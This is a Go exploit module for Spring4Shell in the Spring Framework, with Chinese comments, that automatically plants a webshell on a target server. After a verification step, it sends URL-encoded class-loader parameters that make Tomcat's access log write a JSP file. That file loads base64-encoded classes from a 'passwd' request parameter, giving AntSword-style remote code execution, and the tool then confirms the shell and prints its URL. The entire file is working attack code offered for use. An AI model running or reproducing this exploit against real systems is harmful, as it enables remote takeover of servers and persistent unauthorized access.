package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

var ExploitInfo = map[string]string{
	"Name":    "Spring4Shell",
	"Version": "1.0.0",
	"Author":  "Bingan",
	"Desc":    "自动获取 Spring Framework 的 WEBSHELL，蚁剑密码：passwd",
	"Product": "Spring Framework",
}

var Funcs = []string{"GetShell"}

var Url string

// return code, status_code, body
func post(url string, header map[string]string, data string) (int, int, string) {
	client := &http.Client{
		Timeout: time.Second * 10,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}

	req, err := http.NewRequest("POST", url, strings.NewReader(data))

	if err != nil {
		return 0, 0, ""
	}

	for key, value := range header {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)

	if err != nil {
		return 0, 0, ""
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		return 0, 0, ""
	}

	return 1, resp.StatusCode, string(body)
}

func Verity() bool {
	if Url == "" {
		return false
	}

	body1 := "class.module.classLoader.resources.context.parent.pipeline.first.pattern=poc&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=PocName&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT/&class.module.classLoader.resources.context.parent.pipeline.first.prefix="
	body2 := "class.module.classLoader.resources.context.parent.pipeline.first.pattern=&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=.yyyy-MM-dd&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/logs&class.module.classLoader.resources.context.parent.pipeline.first.prefix="

	headers := map[string]string{
		"prefix":       "<%!",
		"abc":          "<%",
		"suffix":       "%>",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
		"Accept":       "*/*",
	}

	// 生成 随机数
	rand := time.Now().UnixNano()

	body1 = strings.ReplaceAll(body1, "PocName", fmt.Sprintf("%d", rand))

	code, statusCode, _ := post(Url, headers, body1)
	post(Url, headers, body2)

	if code == 1 && statusCode == 200 {

		time.Sleep(time.Second * 10)

		r, err := http.Get(Url + "/" + fmt.Sprintf("%d", rand) + ".txt")
		if err != nil {
			return false
		}

		defer r.Body.Close()

		returnBody, _ := ioutil.ReadAll(r.Body)

		if strings.Contains(string(returnBody), "poc") {
			return true
		}
		return false

	} else {
		return false
	}
}

func GetShell() bool {

	if Url == "" {
		return false
	}

	body1 := "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25{prefix}i%0d%0a%20%20%20%20%63%6c%61%73%73%20%55%20%65%78%74%65%6e%64%73%20%43%6c%61%73%73%4c%6f%61%64%65%72%20%7b%0d%0a%20%20%20%20%20%20%20%20%55%28%43%6c%61%73%73%4c%6f%61%64%65%72%20%63%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%73%75%70%65%72%28%63%29%3b%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%20%20%20%20%70%75%62%6c%69%63%20%43%6c%61%73%73%20%67%28%62%79%74%65%5b%5d%20%62%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%73%75%70%65%72%2e%64%65%66%69%6e%65%43%6c%61%73%73%28%62%2c%20%30%2c%20%62%2e%6c%65%6e%67%74%68%29%3b%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%7d%0d%0a%20%0d%0a%20%20%20%20%70%75%62%6c%69%63%20%62%79%74%65%5b%5d%20%62%61%73%65%36%34%44%65%63%6f%64%65%28%53%74%72%69%6e%67%20%73%74%72%29%20%74%68%72%6f%77%73%20%45%78%63%65%70%74%69%6f%6e%20%7b%0d%0a%20%20%20%20%20%20%20%20%74%72%79%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%43%6c%61%73%73%20%63%6c%61%7a%7a%20%3d%20%43%6c%61%73%73%2e%66%6f%72%4e%61%6d%65%28%22%73%75%6e%2e%6d%69%73%63%2e%42%41%53%45%36%34%44%65%63%6f%64%65%72%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%28%62%79%74%65%5b%5d%29%20%63%6c%61%7a%7a%2e%67%65%74%4d%65%74%68%6f%64%28%22%64%65%63%6f%64%65%42%75%66%66%65%72%22%2c%20%53%74%72%69%6e%67%2e%63%6c%61%73%73%29%2e%69%6e%76%6f%6b%65%28%63%6c%61%7a%7a%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%29%2c%20%73%74%72%29%3b%0d%0a%20%20%20%20%20%20%20%20%7d%20%63%61%74%63%68%20%28%45%78%63%65%70%74%69%6f%6e%20%65%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%43%6c%61%73%73%20%63%6c%61%7a%7a%20%3d%20%43%6c%61%73%73%2e%66%6f%72%4e%61%6d%65%28%22%6a%61%76%61%2e%75%74%69%6c%2e%42%61%73%65%36%34%22%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%4f%62%6a%65%63%74%20%64%65%63%6f%64%65%72%20%3d%20%63%6c%61%7a%7a%2e%67%65%74%4d%65%74%68%6f%64%28%22%67%65%74%44%65%63%6f%64%65%72%22%29%2e%69%6e%76%6f%6b%65%28%6e%75%6c%6c%29%3b%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%72%65%74%75%72%6e%20%28%62%79%74%65%5b%5d%29%20%64%65%63%6f%64%65%72%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%4d%65%74%68%6f%64%28%22%64%65%63%6f%64%65%22%2c%20%53%74%72%69%6e%67%2e%63%6c%61%73%73%29%2e%69%6e%76%6f%6b%65%28%64%65%63%6f%64%65%72%2c%20%73%74%72%29%3b%0d%0a%20%20%20%20%20%20%20%20%7d%0d%0a%20%20%20%20%7d%0d%0a%25{suffix}i%0d%0a%25{abc}i%0d%0a%20%20%20%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%68%65%6c%6c%6f%20%62%67%22%29%3b%0d%0a%20%20%20%20%53%74%72%69%6e%67%20%63%6c%73%20%3d%20%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%70%61%73%73%77%64%22%29%3b%0d%0a%20%20%20%20%69%66%20%28%63%6c%73%20%21%3d%20%6e%75%6c%6c%29%20%7b%0d%0a%20%20%20%20%20%20%20%20%6e%65%77%20%55%28%74%68%69%73%2e%67%65%74%43%6c%61%73%73%28%29%2e%67%65%74%43%6c%61%73%73%4c%6f%61%64%65%72%28%29%29%2e%67%28%62%61%73%65%36%34%44%65%63%6f%64%65%28%63%6c%73%29%29%2e%6e%65%77%49%6e%73%74%61%6e%63%65%28%29%2e%65%71%75%61%6c%73%28%70%61%67%65%43%6f%6e%74%65%78%74%29%3b%0d%0a%20%20%20%20%7d%0d%0a%25{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=ShellName&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT/&class.module.classLoader.resources.context.parent.pipeline.first.prefix="
	body2 := "class.module.classLoader.resources.context.parent.pipeline.first.pattern=&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=.yyyy-MM-dd&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.txt&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/logs&class.module.classLoader.resources.context.parent.pipeline.first.prefix="

	headers := map[string]string{
		"prefix":       "<%!",
		"abc":          "<%",
		"suffix":       "%>",
		"Content-Type": "application/x-www-form-urlencoded",
		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Safari/537.36",
		"Accept":       "*/*",
	}

	// 生成 随机数
	rand := time.Now().UnixNano()

	body1 = strings.ReplaceAll(body1, "ShellName", fmt.Sprintf("%d", rand))

	code, statusCode, _ := post(Url, headers, body1)
	post(Url, headers, body2)

	if code == 1 && statusCode == 200 {

		time.Sleep(time.Second * 10)

		r, err := http.Get(Url + "/" + fmt.Sprintf("%d", rand) + ".jsp")
		if err != nil {
			return false
		}

		defer r.Body.Close()

		returnBody, _ := ioutil.ReadAll(r.Body)

		if strings.Contains(string(returnBody), "hello bg") {
			fmt.Println("[+] 获取到 WEBSHELL: " + Url + "/" + fmt.Sprintf("%d", rand) + ".jsp" + "，蚁剑密码：passwd")
			return true
		}
		return false

	} else {
		return false
	}

}
